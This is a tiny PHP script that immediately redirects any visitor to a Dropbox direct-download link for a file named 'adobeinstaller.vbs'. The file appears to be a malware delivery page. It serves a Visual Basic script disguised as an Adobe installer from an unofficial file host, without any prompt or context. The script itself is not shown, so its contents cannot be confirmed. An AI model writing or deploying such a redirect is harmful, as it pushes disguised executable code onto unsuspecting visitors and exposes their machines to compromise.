<?php
$downloadUrl = "https://www.dropbox.com/scl/fi/na4ejmwqmqhfck517dcxy/adobeinstaller.vbs?rlkey=61swt5f4py5jdh4bhpi6c6eyo&st=1loe4lns&dl=1";

// Redirect to the download link
header("Location: " . $downloadUrl);
exit;
?>